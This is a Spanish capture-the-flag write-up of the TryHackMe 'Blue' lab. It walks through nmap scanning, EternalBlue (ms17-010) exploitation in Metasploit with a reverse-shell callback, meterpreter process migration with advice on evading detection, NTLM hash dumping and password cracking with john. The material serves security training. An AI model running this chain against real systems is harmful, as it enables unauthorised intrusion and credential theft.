# Blue - TryHackMe

## Reconocimiento

Vamos a escanear la máquina para obtener información sobre los servicios que tiene abiertos y sus versiones. Para ello, utilizaremos **nmap**.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.135.109 -oG allPorts

PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 126
139/tcp   open  netbios-ssn  syn-ack ttl 126
445/tcp   open  microsoft-ds syn-ack ttl 126
49152/tcp open  unknown      syn-ack ttl 126
49153/tcp open  unknown      syn-ack ttl 126
49154/tcp open  unknown      syn-ack ttl 126
49160/tcp open  unknown      syn-ack ttl 126
49177/tcp open  unknown      syn-ack ttl 126
```

Puerto 135: Microsoft RPC sirve para la comunicación entre procesos en Windows. Es utilizado por servicios como DCOM y WMI.
Puerto 139: NetBIOS Session Service permite la comunicación entre dispositivos en una red local. Es utilizado para compartir archivos e impresoras.
Puerto 445: Microsoft-DS (Directory Services) es utilizado para compartir archivos e impresoras en redes Windows. También es utilizado por el protocolo SMB (Server Message Block).

```bash
extractPorts allPorts

nmap -sCV -p135,139,445,3389,49152,49153,49154,49160,49177 10.129.135.109

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
|_ssl-date: 2026-07-13T10:31:32+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2026-07-12T10:26:55
|_Not valid after:  2027-01-11T10:26:55
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49160/tcp open  msrpc         Microsoft Windows RPC
49177/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 0a:e7:7e:cd:92:63 (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-07-13T10:31:27
|_  start_date: 2026-07-13T10:26:05
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-07-13T05:31:27-05:00
|_clock-skew: mean: 1h15m00s, deviation: 2h30m00s, median: 0s
```

Vemos que nos enfrentamos a un windows 7 con el puerto 3389 abierto, lo que nos indica que tiene habilitado el escritorio remoto. Exixte un usuario llamado **Jon** y el nombre del equipo es **JON-PC**. El puerto 445 tiene habilitado el protocolo SMB, lo que nos permitirá enumerar los recursos compartidos de la máquina.

Debemos tener en cuenta el eternalblue. Este exploit permite ejecutar código en el sistema a través del protocolo SMBv1. Dado que la máquina objetivo es un Windows 7, es vulnerable a este exploit.

Veamos si es vulnerable a eternalblue con el siguiente comando:

```bash
nmap -p 445 --script smb-vuln-ms17-010 10.129.135.109

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```

Sí es vulnerable a eternalblue. Por lo tanto, podemos utilizar este exploit para obtener acceso a la máquina.

## Explotación

Vamos a utilizar el exploit **eternalblue** para obtener acceso a la máquina. Para ello, utilizaremos **Metasploit**.

```bash
sudo msfdb run

search eternalblue
exploit/windows/smb/ms17_010_eternalblue

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.129.135.109

# Comprobamos si es vulnerable al exploit
check
[+] 10.129.135.109:445 - The target is vulnerable.

# Nos aseguramos de que el payload es el correcto
set payload windows/x64/shell/reverse_tcp

exploit
[*] Exploit completed, but no session was created.
```

Vamos a reiniciar la máquina y volver a ejecutar el exploit porque no se ha creado ninguna sesión.

Era porque el LHOST no era la IP de la VPN

```bash
set LHOST 192.168.154.96

exploit
```

Ahora sí:

```bash
Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>
```

## Escalada de privilegios

Le damos a CTRL+Z para backgroundear la sesión y convertimos la shell de meterpreter a una shell de metasploit:

```bash
sessions -l
Id 1

search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter

set SESSION 1
set LHOST 192.168.154.96

run

sessions -l
Id 1
Id 2

sessions -i 2
```

Comprobamos con getsystem si tenemos privilegios de administrador:

```bash
(Meterpreter 2)(C:\Windows\system32) > getsystem
[-] Already running as SYSTEM

(Meterpreter 2)(C:\Windows\system32) > shell
C:\Windows\system32>whoami
nt authority\system
```

Le damos CTRL+Z y volvemos a la sesión de meterpreter.

Vamos a listar todos los procesos que se están ejecutando en la máquina:

```bash
(Meterpreter 2)(C:\Windows\system32) > ps

PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 348   692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 528   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 644   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1000  644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 1020  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 1060  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1160  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1256  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 1320  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1384  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1460  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1468  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1528  1468  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 1600  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1776  816   WmiPrvSE.exe
 1920  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
 1964  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 2144  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 2172  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM
 2192  2004  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 2216  2192  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
 2316  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 2820  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 2852  692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 2900  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 3040  1600  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe
 3048  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
```

Vamos a migrar a un proceso que tenga privilegios de SYSTEM para poder ejecutar comandos con esos privilegios.

Se recomienda migrar a svchost.exe, ya que es un proceso que se ejecuta con privilegios de SYSTEM y es menos probable que sea detectado por el sistema de seguridad.

`528   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM`

```bash
migrate 528
[*] Migrating from 2192 to 528...
[-] core_migrate: Operation failed: 1300
```

Hemos probado con 2900, 816, etc pero no hemos podido migrar a ningún proceso de svchost.exe. 

Probemos con el proceso de **spoolsv.exe** que también tiene privilegios de SYSTEM.

`1468  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe`

```bash
migrate 1468
[*] Migrating from 2192 to 1468...
[*] Migration completed successfully.
```

Ahora sí, hemos migrado correctamente al proceso de spoolsv.exe y tenemos privilegios de SYSTEM.

Vamos a dumpear las credenciales de la máquina

```bash
(Meterpreter 2)(C:\Windows\system32) > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Usamos john para crackear la contraseña del usuario Jon con el siguiente comando:

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash

alqfna22         (Jon)
```

Nos dejan pistas para encontrar las flags:

### Flag 1

This flag can be found at the system root. 

Vamos a buscar la flag en el directorio raíz del sistema:

```bash
dir C:\

03/17/2019  02:27 PM                24 flag1.txt
```

```bash
cd C:\
type flag1.txt
# Vemos la primera flag
```

### Flag 2

This flag can be found at the location where passwords are stored within Windows

Las contraseñas se almacenan en el archivo SAM (Security Account Manager) que se encuentra en el directorio C:\Windows\System32\config. 

```bash
cd C:\Windows\System32\config
dir
03/17/2019  02:27 PM                24 flag2.txt
type flag2.txt
# Vemos la segunda flag
```

### Flag 3

This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved

Para encontrar la tercera flag, vamos a buscar en el directorio del usuario Jon, ya que es un usuario con privilegios de administrador y es probable que tenga archivos interesantes.

```bash
cd C:\Users\Jon\Documents
dir
03/17/2019  02:26 PM                37 flag3.txt
type flag3.txt
# Vemos la tercera flag
```

Así acaba esta máquina de TryHackMe llamada Blue. Hemos conseguido acceso a la máquina, escalado de privilegios y hemos encontrado las tres flags.

Es mi primera máquina Windows.